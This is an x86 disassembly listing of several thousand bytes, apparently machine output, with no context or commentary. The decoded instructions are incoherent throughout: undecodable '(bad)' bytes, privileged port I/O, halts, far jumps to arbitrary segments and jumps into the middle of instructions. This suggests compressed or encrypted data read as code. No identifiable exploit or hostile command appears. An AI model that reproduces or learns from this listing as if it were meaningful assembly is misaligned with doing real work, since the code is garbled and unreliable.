  41865b:	fimul  DWORD PTR [eax+0x6d5f6908]
  418661:	mov    al,ds:0x55cb903c
  418666:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418667:	xchg   edi,eax
  418668:	pop    esi
  418669:	sub    BYTE PTR [ebp-0x11],ch
  41866c:	mov    WORD PTR [esi+eiz*4-0x51],ds
  418670:	out    0x62,al
  418672:	lock sbb al,0x51
  418675:	mov    ecx,0x2a75a3ad
  41867a:	popfw  
  41867c:	jg     0x418662
  41867e:	jbe    0x418693
  418680:	adc    eax,0x3c5ee50
  418685:	cmp    ax,0xf259
  418689:	std    
  41868a:	das    
  41868b:	bnd jo 0x418638
  41868e:	stos   BYTE PTR es:[edi],al
  41868f:	mov    al,ds:0xd596cc2
  418694:	out    dx,al
  418695:	shl    BYTE PTR [ecx],cl
  418697:	mov    ds:0x77bd285e,al
  41869c:	dec    ebx
  41869d:	outs   dx,BYTE PTR ds:[esi]
  41869e:	out    0x1b,eax
  4186a0:	fisub  WORD PTR [eax-0x38]
  4186a3:	aam    0xc6
  4186a5:	add    ax,0x642f
  4186a9:	add    eax,0xe972aee
  4186ae:	inc    ecx
  4186af:	enter  0x2a0f,0x64
  4186b3:	mov    eax,ds:0x3402e89
  4186b8:	pop    ss
  4186b9:	out    dx,al
  4186ba:	mov    WORD PTR [ebp+0x52],?
  4186bd:	inc    esp
  4186be:	addr16 sbb ebx,esi
  4186c1:	fild   QWORD PTR [ebp-0x46021c05]
  4186c7:	mov    al,ds:0x1f3e07bb
  4186cc:	xchg   ebx,eax
  4186cd:	xor    bl,dh
  4186cf:	hlt    
  4186d0:	pop    esi
  4186d1:	arpl   WORD PTR [ebx-0x3e],dx
  4186d4:	test   al,0x51
  4186d6:	ja     0x41870d
  4186d8:	inc    ebp
  4186d9:	inc    esp
  4186da:	in     al,0x51
  4186dc:	add    eax,0x918be8e1
  4186e1:	scas   al,BYTE PTR es:[edi]
  4186e2:	pop    es
  4186e3:	push   ecx
  4186e4:	pop    esi
  4186e5:	shl    BYTE PTR [edi+0x53de7886],1
  4186eb:	daa    
  4186ec:	cdq    
  4186ed:	pusha  
  4186ee:	ficomp WORD PTR gs:[ecx]
  4186f1:	lods   al,BYTE PTR ds:[esi]
  4186f2:	sbb    eax,0xec7b2a29
  4186f7:	fisubr DWORD PTR [edx+0x4dcf757d]
  4186fd:	inc    ecx
  4186fe:	rol    BYTE PTR [esi-0x1f],1
  418701:	pop    esi
  418702:	jl     0x4186f6
  418704:	fwait
  418705:	add    ebp,DWORD PTR [ebx]
  418707:	jns    0x4186f5
  418709:	inc    eax
  41870a:	in     eax,dx
  41870b:	aaa    
  41870c:	xor    DWORD PTR [esi+0x133edd2d],0xa
  418713:	lock push ebp
  418715:	pop    edx
  418716:	cdq    
  418717:	jmp    0xbf70:0x60d141b6
  41871e:	test   eax,0x7e8454c7
  418723:	xor    BYTE PTR [esi],bl
  418725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418726:	iret   
  418727:	int3   
  418728:	mov    ebx,0x39a0e79b
  41872d:	int    0x4f
  41872f:	rcr    DWORD PTR [esi+0x5e0f2300],cl
  418735:	shl    DWORD PTR [eax+0x21],0x17
  418739:	cmp    edi,esi
  41873b:	mov    eax,ds:0xcd41611d
  418740:	xchg   esp,eax
  418741:	push   ss
  418742:	pop    eax
  418743:	nop
  418744:	popf   
  418745:	in     al,dx
  418746:	out    dx,al
  418747:	(bad)
  41874a:	jno    0x41878c
  41874c:	out    0xdf,eax
  41874e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41874f:	xchg   esp,eax
  418750:	repnz scas al,BYTE PTR es:[edi]
  418752:	dec    edx
  418753:	add    DWORD PTR [ecx+0x6ddee22],0xb8e5af77
  41875d:	dec    eax
  41875e:	jg     0x418729
  418760:	pop    edi
  418761:	(bad)  
  418762:	jmp    0x3220:0xe153cefb
  418769:	jmp    0x41874a
  41876b:	mov    bl,BYTE PTR [esi+0x2f]
  41876e:	dec    ecx
  41876f:	xchg   edi,eax
  418770:	xlat   BYTE PTR ds:[ebx]
  418771:	int3   
  418772:	adc    ch,bh
  418774:	cs popa 
  418776:	enter  0x76ca,0xe9
  41877a:	push   esi
  41877b:	jnp    0x4187f7
  41877d:	xchg   BYTE PTR [esi+0x23237c9f],dh
  418783:	mov    dh,BYTE PTR [esi]
  418785:	push   ebx
  418786:	mov    ecx,0xb1c0c43d
  41878b:	xchg   edx,eax
  41878c:	mov    ds:0x8ea17321,eax
  418791:	loope  0x4187cf
  418793:	rcr    BYTE PTR [ecx+0x5eae7f5c],cl
  418799:	sub    BYTE PTR [ecx-0x240950b7],ah
  41879f:	retf   0x42aa
  4187a2:	xchg   ebp,eax
  4187a3:	call   0x370:0x32a660f7
  4187aa:	stc    
  4187ab:	push   ebp
  4187ac:	dec    DWORD PTR [bp+di-0x37f4]
  4187b1:	pusha  
  4187b2:	mov    al,0x16
  4187b4:	out    dx,al
  4187b5:	es shl bl,1
  4187b8:	lock pusha 
  4187ba:	jecxz  0x418826
  4187bc:	xor    eax,0xde24437f
  4187c1:	push   es
  4187c2:	add    al,ah
  4187c4:	inc    edi
  4187c5:	int3   
  4187c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187c7:	shr    DWORD PTR ds:0x61d4fe11,cl
  4187cd:	cmc    
  4187ce:	xor    ch,BYTE PTR [ecx+0x49e7fd93]
  4187d4:	cmc    
  4187d5:	push   0xab60712d
  4187da:	int3   
  4187db:	pop    ds
  4187dc:	pop    esi
  4187dd:	int3   
  4187de:	repz add eax,0x645fe22c
  4187e4:	xchg   ebx,eax
  4187e5:	and    al,0xe
  4187e7:	test   al,0x33
  4187e9:	test   BYTE PTR [ebx],ah
  4187eb:	push   ebp
  4187ec:	adc    al,0x71
  4187ee:	(bad)  
  4187ef:	cmp    eax,0xf8eeabf9
  4187f4:	lods   al,BYTE PTR ds:[esi]
  4187f5:	lods   al,BYTE PTR ds:[esi]
  4187f6:	and    eax,0x69d972f3
  4187fb:	mov    eax,ds:0x1af07305
  418800:	cli    
  418801:	jne    0x418843
  418803:	into   
  418804:	pop    esi
  418805:	push   ds
  418806:	lods   eax,DWORD PTR ds:[esi]
  418807:	adc    edx,DWORD PTR [edi+0x7d]
  41880a:	jae    0x418849
  41880c:	stos   BYTE PTR es:[edi],al
  41880d:	pusha  
  41880e:	adc    dl,bh
  418810:	mov    dl,0x59
  418812:	test   BYTE PTR [edx+0x3b],ah
  418815:	jnp    0x418805
  418817:	sbb    DWORD PTR [eax+0x3c],esi
  41881a:	pop    eax
  41881b:	test   DWORD PTR ds:0xe908d200,eax
  418821:	pusha  
  418822:	inc    edx
  418823:	pop    ebp
  418824:	cmp    eax,0xb7a5cdf8
  418829:	pop    es
  41882a:	out    dx,al
  41882b:	retf   0x4ab
  41882e:	daa    
  41882f:	push   esi
  418830:	jl     0x418898
  418832:	mov    BYTE PTR [eax-0x7c],0x87
  418836:	jmp    0x4187fe
  418838:	or     eax,0x9dbca9ff
  41883d:	pusha  
  41883e:	ret    0x4c3c
  418841:	fwait
  418842:	ja     0x418835
  418844:	pop    esi
  418845:	adc    edi,0x1fef85a9
  41884b:	mov    DWORD PTR [edi+0x25],ebx
  41884e:	sub    DWORD PTR [ecx+0xb66a981],esp
  418854:	push   ebp
  418855:	ficom  WORD PTR [ebx+0x50d35e6e]
  41885b:	sbb    esi,esi
  41885d:	mov    ebx,0x6041a562
  418862:	sbb    eax,0x2ce22f95
  418867:	rcr    DWORD PTR [eax],cl
  418869:	(bad)  
  41886a:	in     eax,dx
  41886b:	lock nop
  41886d:	aaa    
  41886e:	cld    
  41886f:	loope  0x4187fb
  418871:	sub    esp,DWORD PTR [ebp+0x103f2ba1]
  418877:	arpl   WORD PTR [eax+ebx*2+0x4a5e1592],ax
  41887e:	and    BYTE PTR [edi],ch
  418880:	sti    
  418881:	cmp    BYTE PTR [edi+0x2d570a74],dh
  418887:	adc    esp,0x26a13a20
  41888d:	rcr    BYTE PTR [esi-0x61],cl
  418890:	mov    dl,0x55
  418892:	repz inc esp
  418894:	xor    BYTE PTR [edi+0x5166285f],cl
  41889a:	sbb    eax,0x36ec583f
  41889f:	mov    ebp,0x1e3800fe
  4188a4:	mov    ecx,0x942f3260
  4188a9:	xor    al,0xb7
  4188ab:	pushf  
  4188ac:	shl    DWORD PTR ds:0x50b1e8ee,1
  4188b2:	je     0x4188db
  4188b4:	les    esi,FWORD PTR [ecx+esi*8+0x706748a0]
  4188bb:	xor    esp,DWORD PTR [ecx]
  4188bd:	sbb    ebp,esi
  4188bf:	jmp    0xf791:0xcca175e
  4188c6:	xchg   ebx,eax
  4188c7:	retf   0x5174
  4188ca:	in     eax,0x3
  4188cc:	enter  0x4e9f,0xd0
  4188d0:	test   DWORD PTR [ebx],ecx
  4188d2:	aam    0x4f
  4188d4:	pop    esp
  4188d5:	inc    edi
  4188d6:	stos   BYTE PTR es:[edi],al
  4188d7:	ret    0xadc5
  4188da:	scas   al,BYTE PTR es:[edi]
  4188db:	mov    al,ds:0x772dd42
  4188e0:	mov    ecx,0x5e485c77
  4188e5:	sub    DWORD PTR [edi],0x2c
  4188e8:	push   ecx
  4188e9:	stos   DWORD PTR es:[edi],eax
  4188ea:	jg     0x4188e4
  4188ec:	jno    0x41894e
  4188ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188ef:	mov    al,0x82
  4188f1:	dec    esi
  4188f2:	pop    ebx
  4188f3:	sub    eax,ebx
  4188f5:	mov    bl,0xee
  4188f7:	adc    BYTE PTR [edx],ah
  4188f9:	sbb    esi,DWORD PTR [ebx-0x1299974c]
  4188ff:	lods   al,BYTE PTR ds:[esi]
  418900:	adc    eax,0x2eb1ee8a
  418905:	xor    eax,0xd49e83f1
  41890a:	out    0xba,al
  41890c:	pop    esi
  41890d:	lods   al,BYTE PTR ds:[esi]
  41890e:	jnp    0x4188b8
  418910:	xchg   BYTE PTR [ecx-0x7d],al
  418913:	je     0x4188ee
  418915:	inc    ecx
  418916:	cli    
  418917:	data16 cmp bl,BYTE PTR [edx+0x17]
  41891b:	les    ecx,FWORD PTR [edx]
  41891d:	adc    DWORD PTR [eax-0x11ab1415],ebp
  418923:	jge    0x4188db
  418925:	adc    DWORD PTR [edx],ebp
  418927:	sub    BYTE PTR [ecx],ch
  418929:	push   cs
  41892a:	xchg   esp,eax
  41892b:	mov    eax,ds:0x750995d0
  418930:	rol    BYTE PTR [ecx],0x23
  418933:	jae    0x418989
  418935:	jb     0x41891a
  418937:	sub    ebx,DWORD PTR [esi-0x41]
  41893a:	or     BYTE PTR ds:0x70df028e,bh
  418940:	mov    BYTE PTR [eax+0x42],ah
  418943:	mov    ebp,0xcdceab45
  418948:	ins    DWORD PTR es:[edi],dx
  418949:	pop    edi
  41894a:	clc    
  41894b:	mov    ds,WORD PTR [ebx]
  41894d:	push   ss
  41894e:	out    dx,al
  41894f:	icebp  
  418950:	push   cs
  418951:	out    0x92,eax
  418953:	sub    BYTE PTR [edx-0x335a8cbf],dh
  418959:	xchg   ecx,eax
  41895a:	xchg   dl,ch
  41895c:	jle    0x41894e
  41895e:	mov    ebp,0xeea87211
  418963:	pop    ecx
  418964:	(bad)  
  418965:	jo     0x418961
  418967:	push   ecx
  418968:	bnd call 0x617a7be3
  41896e:	or     DWORD PTR [edi+0x1],eax
  418971:	push   ds
  418972:	loopne 0x4189e7
  418974:	(bad)  
  418975:	cdq    
  418976:	mov    es,WORD PTR [edx+0x22]
  418979:	jae    0x418968
  41897b:	jp     0x418970
  41897d:	loopne 0x418986
  41897f:	loope  0x41898b
  418981:	rcr    esi,0xe2
  418984:	mov    WORD PTR [ebx-0x34],ds
  418987:	shr    BYTE PTR [esi],cl
  418989:	mov    dl,0xe8
  41898b:	outs   dx,BYTE PTR ds:[esi]
  41898c:	pop    esi
  41898d:	pop    ebx
  41898e:	cmp    al,0xbc
  418990:	xchg   ebp,eax
  418991:	sti    
  418992:	pop    esi
  418993:	mov    eax,ds:0xdabbd6dc
  418998:	add    ch,0x1f
  41899b:	imul   ebp,ebp,0x7b
  41899e:	out    dx,al
  41899f:	mov    bl,0x70
  4189a1:	les    ebx,FWORD PTR [ebx+0x6f739f4e]
  4189a7:	mov    eax,ds:0x25816840
  4189ac:	ds adc eax,0xcc512947
  4189b2:	mov    esi,0x87545e1a
  4189b7:	xchg   ebx,eax
  4189b8:	les    ecx,FWORD PTR [edx]
  4189ba:	jg     0x41895d
  4189bc:	sbb    eax,0xdd4564d9
  4189c1:	xor    al,0xcf
  4189c3:	sbb    DWORD PTR [esi-0x2d],0x47
  4189c7:	mov    bl,al
  4189c9:	sbb    eax,DWORD PTR [esi-0x3c]
  4189cc:	test   eax,0xebaa5b51
  4189d1:	std    
  4189d2:	outs   dx,BYTE PTR ds:[esi]
  4189d3:	inc    eax
  4189d4:	shl    BYTE PTR [ebx-0x52],1
  4189d7:	sub    al,0x5e
  4189d9:	test   al,0xf9
  4189db:	sbb    DWORD PTR [ecx-0x24074bbf],edx
  4189e1:	mov    dh,0xd5
  4189e3:	mov    al,ds:0xb8b7bdb1
  4189e8:	add    dh,BYTE PTR [edi]
  4189ea:	jno    0x418a52
  4189ec:	aaa    
  4189ed:	adc    esp,DWORD PTR [esi-0x5f]
  4189f0:	jl     0x418a3e
  4189f2:	lods   al,BYTE PTR ds:[esi]
  4189f3:	(bad)  
  4189f4:	inc    eax
  4189f5:	xor    DWORD PTR [ebx-0x5f],edi
  4189f8:	add    eax,eax
  4189fa:	(bad)  
  4189fb:	in     al,0xa
  4189fd:	inc    DWORD PTR [edi+0x7dd35ed1]
  418a03:	xor    DWORD PTR [esi-0xfef28ba],ecx
  418a09:	pop    ecx
  418a0a:	sub    BYTE PTR [ebp+0x71181ec1],dh
  418a10:	mov    dl,0x72
  418a12:	push   eax
  418a13:	add    ebx,DWORD PTR [esi-0x70]
  418a16:	cdq    
  418a17:	inc    ebx
  418a19:	wbinvd 
  418a1b:	cmc    
  418a1c:	and    BYTE PTR [eax+0x40],0x24
  418a20:	hlt    
  418a21:	sub    al,BYTE PTR [esi+eiz*8-0x27]
  418a25:	cmp    esi,DWORD PTR [esi+0x7a60ded3]
  418a2b:	add    BYTE PTR [ecx-0x16e43173],al
  418a31:	inc    ebx
  418a32:	jno    0x418a06
  418a34:	imul   esp,DWORD PTR [eax+0x21cd4e19],0x89eb76d
  418a3e:	jecxz  0x4189e2
  418a40:	outs   dx,DWORD PTR ds:[esi]
  418a41:	enter  0xa139,0xd5
  418a45:	daa    
  418a46:	popa   
  418a47:	sub    eax,0x4a98baf0
  418a4c:	jle    0x418a31
  418a4e:	out    dx,al
  418a4f:	inc    eax
  418a50:	and    BYTE PTR [edx],dl
  418a52:	pop    ebp
  418a53:	jns    0x418a6a
  418a55:	sbb    DWORD PTR [ecx+eiz*4+0x57],esp
  418a59:	retf   
  418a5a:	out    dx,eax
  418a5b:	aam    0x72
  418a5d:	xchg   edx,eax
  418a5e:	push   ds
  418a5f:	arpl   WORD PTR [esi+0x35],bx
  418a62:	xor    DWORD PTR [ecx+0x4],ecx
  418a65:	clc    
  418a66:	and    BYTE PTR ds:0x6ba6611d,bh
  418a6c:	xchg   ebp,eax
  418a6d:	repnz sbb dh,ch
  418a70:	mov    DWORD PTR [ebp+0x607957c6],ebp
  418a76:	in     eax,0xbd
  418a78:	and    eax,0x32b6cfc4
  418a7d:	popa   
  418a7e:	jae    0x418a4f
  418a80:	mov    cs,esi
  418a82:	loop   0x418a63
  418a84:	xchg   dh,dh
  418a86:	out    dx,al
  418a87:	jecxz  0x418a13
  418a89:	int    0x60
  418a8b:	test   BYTE PTR [edi-0x275ed36d],0xbc
  418a92:	add    eax,0xdf7c9982
  418a97:	push   ds
  418a98:	push   eax
  418a99:	push   0xffffff85
  418a9b:	retf   
  418a9c:	scas   al,BYTE PTR es:[edi]
  418a9d:	cs cmp al,0x77
  418aa0:	or     esp,DWORD PTR [ecx-0x1c]
  418aa3:	jb     0x418ae3
  418aa5:	in     al,0xeb
  418aa7:	ja     0x418ab9
  418aa9:	retf   
  418aaa:	and    eax,0xeea7a9c5
  418aaf:	sti    
  418ab0:	leave  
  418ab1:	mov    dh,BYTE PTR ds:[edx-0x5f526d8a]
  418ab8:	and    bh,ah
  418aba:	cld    
  418abb:	sbb    eax,0x3b056d1b
  418ac0:	pop    esi
  418ac1:	loopne 0x418a91
  418ac3:	push   esi
  418ac4:	cmc    
  418ac5:	pop    ebx
  418ac6:	xor    dh,BYTE PTR [esi+0x33]
  418ac9:	popa   
  418aca:	loop   0x418a88
  418acc:	es ss jnp 0x418aa4
  418ad0:	int3   
  418ad1:	jge    0x418aba
  418ad3:	add    bl,BYTE PTR [esi+edx*2+0x5]
  418ad7:	cmp    DWORD PTR [esi],ecx
  418ad9:	ds in  al,0x44
  418adc:	in     al,0x57
  418ade:	test   al,0xf3
  418ae0:	ret    0xeeb0
  418ae3:	inc    edi
  418ae4:	nop
  418ae5:	sti    
  418ae6:	xchg   esp,eax
  418ae7:	mov    ch,0x54
  418ae9:	and    BYTE PTR [ebp+0x44],bh
  418aec:	pop    ebx
  418aed:	das    
  418aee:	jb     0x418abe
  418af0:	mov    edi,0x354a021b
  418af5:	dec    ebp
  418af6:	into   
  418af7:	xor    ah,dh
  418af9:	jp     0x418ac3
  418afb:	dec    edx
  418afc:	adc    ah,BYTE PTR [ecx-0x67]
  418aff:	loop   0x418ac6
  418b01:	push   edx
  418b02:	mov    ah,0x67
  418b04:	pop    esi
  418b05:	outs   dx,DWORD PTR ds:[esi]
  418b06:	jae    0x418b52
  418b08:	inc    eax
  418b09:	push   eax
  418b0a:	int    0xb7
  418b0c:	mov    eax,0x8494de60
  418b11:	sbb    al,0xae
  418b13:	push   ebx
  418b14:	in     al,0xdc
  418b16:	in     eax,dx
  418b17:	mov    ds:0x6f6d616a,al
  418b1c:	mov    es,esi
  418b1e:	xor    dh,BYTE PTR [edi-0x35]
  418b21:	pop    ecx
  418b22:	sar    DWORD PTR [esi+eiz*2+0x4],1
  418b26:	cmp    cl,dl
  418b28:	push   esi
  418b29:	pop    es
  418b2a:	push   ds
  418b2b:	xor    ebp,edi
  418b2d:	test   BYTE PTR [eax],dl
  418b2f:	mov    edi,0xc0e997b9
  418b34:	inc    eax
  418b35:	push   edx
  418b36:	addr16 adc eax,0xe67f5c4e
  418b3c:	pop    edi
  418b3d:	popa   
  418b3e:	sbb    BYTE PTR [ebx+0x5045d30d],ch
  418b44:	xor    eax,0xecedee33
  418b49:	adc    bl,BYTE PTR [ecx+eiz*1-0xcd0ac65]
  418b50:	inc    edi
  418b51:	push   ebx
  418b52:	pop    ss
  418b53:	cmp    eax,0x9ece3501
  418b58:	xchg   DWORD PTR [esi],eax
  418b5a:	cmc    
  418b5b:	adc    edi,ebp
  418b5d:	cmp    al,0xd8
  418b5f:	jne    0x418b9d
  418b61:	dec    esp
  418b62:	xchg   DWORD PTR [ebp+0x5e],eax
  418b65:	or     BYTE PTR [esi-0x23],bl
  418b68:	stos   BYTE PTR es:[edi],al
  418b69:	mov    BYTE PTR [edi],bh
  418b6b:	mov    eax,ds:0x873c1d0
  418b70:	lods   al,BYTE PTR ds:[esi]
  418b71:	(bad)  
  418b72:	clc    
  418b73:	arpl   WORD PTR [esi+0x20],bx
  418b76:	fdivr  DWORD PTR [edx+0x7d]
  418b79:	ret    0xa2e1
  418b7c:	add    esp,DWORD PTR [ecx+0x70]
  418b7f:	mov    ecx,DWORD PTR [ecx-0x33a5bef5]
  418b85:	icebp  
  418b86:	out    dx,al
  418b87:	test   DWORD PTR [edi-0x636e8ad8],0xe2a107ad
  418b91:	add    al,0x42
  418b93:	sub    edx,ecx
  418b95:	in     eax,dx
  418b96:	jecxz  0x418b7a
  418b98:	pop    esi
  418b99:	jge    0x418b6f
  418b9b:	in     eax,0xb9
  418b9d:	cmc    
  418b9e:	inc    eax
  418b9f:	loope  0x418ba5
  418ba1:	popa   
  418ba2:	dec    ebp
  418ba3:	or     eax,0x5783d347
  418ba8:	dec    ecx
  418ba9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418baa:	out    0xf4,eax
  418bac:	fst    DWORD PTR [edx+0x496f21c8]
  418bb2:	add    cl,BYTE PTR [ecx]
  418bb4:	je     0x418c1a
  418bb6:	sbb    eax,0xd00b3aa1
  418bbb:	(bad)  
  418bbd:	adc    al,0x4d
  418bbf:	or     al,0x7e
  418bc1:	dec    edx
  418bc2:	out    0xfd,eax
  418bc4:	das    
  418bc5:	outs   dx,DWORD PTR ds:[esi]
  418bc6:	xchg   edx,eax
  418bc7:	sbb    esi,ecx
  418bc9:	loope  0x418b7a
  418bcb:	test   DWORD PTR [esi+ebx*2],eax
  418bce:	das    
  418bcf:	(bad)  
  418bd0:	push   edi
  418bd1:	jae    0x418c18
  418bd3:	outs   dx,DWORD PTR ds:[esi]
  418bd4:	xchg   ebp,eax
  418bd5:	jo     0x418bec
  418bd7:	loope  0x418bb0
  418bd9:	fucomi st,st(2)
  418bdb:	jmp    0x292d2a3d
  418be0:	mov    esi,0x8a7b7c1b
  418be5:	pop    ds
  418be6:	mov    edi,0x7d5ad1a7
  418beb:	lea    ebp,[edi-0x10]
  418bee:	push   ds
  418bef:	clc    
  418bf0:	lods   eax,DWORD PTR ds:[esi]
  418bf1:	mov    ah,0xed
  418bf3:	mov    bl,0x5a
  418bf5:	fldenv [edi-0x51]
  418bf8:	daa    
  418bf9:	jbe    0x418c55
  418bfb:	sti    
  418bfc:	cdq    
  418bfd:	arpl   WORD PTR [esi],bp
  418bff:	(bad)  
  418c00:	fisubr WORD PTR [ecx]
  418c02:	push   ecx
  418c03:	in     al,dx
  418c04:	jmp    0xfec5:0x5ee59c9f
  418c0b:	and    eax,0x4357c228
  418c10:	xchg   esp,eax
  418c11:	pusha  
  418c12:	adc    al,0xf8
  418c14:	not    BYTE PTR ds:0xeea3a803
  418c1b:	sbb    edi,DWORD PTR [edi+0x79]
  418c1e:	or     eax,0xb458b17
  418c23:	lea    eax,[edi]
  418c25:	(bad)  
  418c26:	xchg   edi,eax
  418c27:	and    DWORD PTR [edx-0x3cc1e861],esi
  418c2d:	std    
  418c2e:	out    dx,al
  418c2f:	dec    esp
  418c30:	test   DWORD PTR [ecx-0x64],esi
  418c33:	aad    0x4f
  418c35:	lds    edi,FWORD PTR [edx]
  418c37:	mov    eax,ds:0xee1b430b
  418c3c:	loopne 0x418bf0
  418c3e:	sbb    cl,ch
  418c40:	pop    esi
  418c41:	ins    BYTE PTR es:[edi],dx
  418c42:	or     eax,0x337ea4fa
  418c47:	es mov ch,0x68
  418c4a:	inc    edx
  418c4b:	scas   eax,DWORD PTR es:[edi]
  418c4c:	fisub  WORD PTR [ecx-0xb43f5ec]
  418c52:	adc    ebp,DWORD PTR [edx-0x58119915]
  418c58:	out    dx,eax
  418c59:	mov    ecx,0x5dd93268
  418c5e:	and    BYTE PTR [ecx-0x3ec66137],0x1f
  418c65:	idiv   dh
  418c67:	jg     0x418cc7
  418c69:	lea    esi,[edi+eax*2]
  418c6c:	jns    0x418c7b
  418c6e:	adc    bl,BYTE PTR [ecx+0x674b6128]
  418c74:	ficom  DWORD PTR [ebx]
  418c76:	loop   0x418c47
  418c78:	int3   
  418c79:	adc    ch,dh
  418c7b:	pop    esi
  418c7c:	push   edx
  418c7d:	div    edx
  418c7f:	push   esi
  418c80:	jle    0x418c5d
  418c82:	test   DWORD PTR [ecx-0x73b3c4ea],esp
  418c88:	dec    esp
  418c89:	xor    DWORD PTR [edi-0x22],esp
  418c8c:	pop    esi
  418c8d:	mov    eax,0xffae7c2d
  418c92:	cmp    DWORD PTR [edi+edi*1+0x61],ebx
  418c96:	cmp    dh,dh
  418c98:	hlt    
  418c99:	push   esi
  418c9a:	add    al,0x90
  418c9c:	lods   eax,DWORD PTR ds:[esi]
  418c9d:	arpl   si,bp
  418c9f:	push   esp
  418ca0:	jbe    0x418c79
  418ca2:	push   es
  418ca3:	jae    0x418c57
  418ca5:	repz push cs
  418ca7:	mov    eax,ds:0xbabbd478
  418cac:	test   eax,0xae32db6a
  418cb1:	sbb    al,0x66
  418cb3:	fistp  DWORD PTR [esi+0x50]
  418cb6:	enter  0xb0,0xaa
  418cba:	mov    eax,0xaf615185
  418cbf:	mov    dh,0x54
  418cc1:	mov    BYTE PTR [edx-0x4a],dl
  418cc4:	xchg   BYTE PTR [ebx-0x8f83b12],dh
  418cca:	xor    al,0x77
  418ccc:	in     eax,0x1c
  418cce:	ja     0x418c71
  418cd0:	stc    
  418cd1:	mov    edx,0x5e37ab8b
  418cd6:	call   0xa75f:0xc1ce5e71
  418cdd:	in     al,0xb9
  418cdf:	bound  edx,QWORD PTR [esi]
  418ce1:	popa   
  418ce2:	xchg   DWORD PTR [ebx-0x50],edx
  418ce5:	(bad)  
  418ce7:	sbb    al,0x2c
  418ce9:	jge    0x418cce
  418ceb:	shl    esp,cl
  418ced:	dec    ecx
  418cee:	out    dx,al
  418cef:	test   DWORD PTR [esi+esi*2+0x1e8e8996],ebp
  418cf6:	aad    0xa0
  418cf8:	daa    
  418cf9:	lock mov DWORD PTR [edx],esp
  418cfc:	or     BYTE PTR [edx+0x19],al
  418cff:	popa   
  418d00:	pop    esi
  418d01:	ret    
  418d02:	enter  0x6605,0x39
  418d06:	ror    BYTE PTR [ecx],1
  418d08:	mov    ah,BYTE PTR [edx+0x1a]
  418d0b:	xchg   ebp,eax
  418d0c:	fiadd  WORD PTR [eax]
  418d0e:	mov    ebp,0x86839af3
  418d13:	mov    ebp,0x24cc985e
  418d18:	or     BYTE PTR [edx],0x8c
  418d1b:	jmp    0xe74e:0xa19a2782
  418d22:	mov    dh,0x2b
  418d24:	mov    esp,0x169a06a8
  418d29:	add    DWORD PTR [edi-0x5f],0xb7493cc4
  418d30:	mov    al,0xaa
  418d32:	out    0xa0,al
  418d34:	daa    
  418d35:	dec    eax
  418d36:	jl     0x418ccd
  418d38:	mov    dl,dl
  418d3a:	ss push ss
  418d3c:	pop    esi
  418d3d:	lds    esp,FWORD PTR [ebx+0xa]
  418d40:	mov    esi,0x6ddf88dd
  418d45:	pusha  
  418d46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d47:	ds inc edx
  418d49:	and    eax,0x68dde65
  418d4e:	out    dx,al
  418d4f:	(bad)  
  418d50:	cmc    
  418d51:	push   esi
  418d52:	sbb    ebx,DWORD PTR [edx+0x3d]
  418d55:	or     eax,DWORD PTR [edi-0x5f]
  418d58:	stc    
  418d59:	mov    ah,0x66
  418d5b:	leave  
  418d5c:	xchg   BYTE PTR [edi-0x5a],ch
  418d5f:	popf   
  418d60:	pop    edi
  418d61:	call   0x39a0:0x3eaa88d
  418d68:	pop    ebp
  418d69:	ror    BYTE PTR [eax+edx*4-0x7d],0xb
  418d6e:	std    
  418d6f:	mov    al,ds:0xf8a55812
  418d74:	mov    esp,0x7ed7e7b2
  418d79:	int    0xb2
  418d7b:	push   es
  418d7c:	pop    ds
  418d7d:	xchg   edx,eax
  418d7e:	jl     0x418db1
  418d80:	pop    esp
  418d81:	sub    al,0x9f
  418d83:	mov    al,ds:0xe7f5b15a
  418d88:	cmp    eax,0xbdd513a
  418d8d:	xchg   esp,eax
  418d8e:	sub    ah,BYTE PTR [ebp+0x18]
  418d91:	mov    ebp,esi
  418d93:	sub    esp,0xab11533d
  418d99:	shl    BYTE PTR [ecx-0x581b4c60],0x4b
  418da0:	data16 int 0x84
  418da3:	je     0x418e02
  418da5:	push   ds
  418da6:	and    DWORD PTR [eax],0x7777b80d
  418dac:	push   0x4d
  418dae:	add    eax,0xc10f2da1
  418db3:	xchg   edi,eax
  418db4:	sbb    al,0x36
  418db6:	adc    dl,BYTE PTR [eax-0x362da0ae]
  418dbc:	pop    esi
  418dbd:	jge    0x418dcb
  418dbf:	aad    0x90
  418dc1:	sbb    DWORD PTR [edi],edx
  418dc3:	jno    0x418e3a
  418dc5:	push   ecx
  418dc6:	pop    eax
  418dc7:	inc    ebx
  418dc8:	daa    
  418dc9:	pop    ecx
  418dca:	scas   al,BYTE PTR es:[edi]
  418dcb:	sbb    DWORD PTR [esi],ebp
  418dcd:	iret   
  418dce:	xchg   ebx,eax
  418dcf:	pop    si
  418dd1:	pop    edi
  418dd2:	scas   eax,DWORD PTR es:[edi]
  418dd3:	fsub   QWORD PTR [esi]
  418dd5:	loop   0x418dbe
  418dd7:	sbb    bh,0x61
  418dda:	ss icebp 
  418ddc:	ficomp WORD PTR [ecx+esi*4-0x1daf733b]
  418de3:	dec    ecx
  418de4:	pop    esi
  418de5:	push   es
  418de6:	push   esi
  418de7:	or     al,0x3a
  418de9:	pop    edi
  418dea:	out    dx,eax
  418deb:	adc    DWORD PTR [edi],edi
  418ded:	pop    edx
  418dee:	lahf   
  418def:	out    dx,al
  418df0:	push   es
  418df1:	outs   dx,BYTE PTR ds:[esi]
  418df2:	js     0x418d75
  418df4:	cmp    eax,0x5e1d6bc1
  418df9:	dec    eax
  418dfa:	inc    eax
  418dfb:	inc    esi
  418dfc:	mov    cl,BYTE PTR [ebp-0x10]
  418dff:	out    dx,al
  418e00:	dec    esp
  418e01:	popa   
  418e02:	popf   
  418e03:	xchg   DWORD PTR [edi+0x41],esi
  418e06:	ficomp WORD PTR [esi]
  418e08:	and    DWORD PTR [edx+0x510e56ff],esp
  418e0e:	jmp    0x418d9a
  418e10:	mov    al,0x8e
  418e12:	mov    eax,ds:0x5a19b44a
  418e17:	lods   al,BYTE PTR ds:[esi]
  418e18:	outs   dx,BYTE PTR ds:[esi]
  418e19:	pusha  
  418e1a:	xor    ebp,DWORD PTR [ebp+0x28]
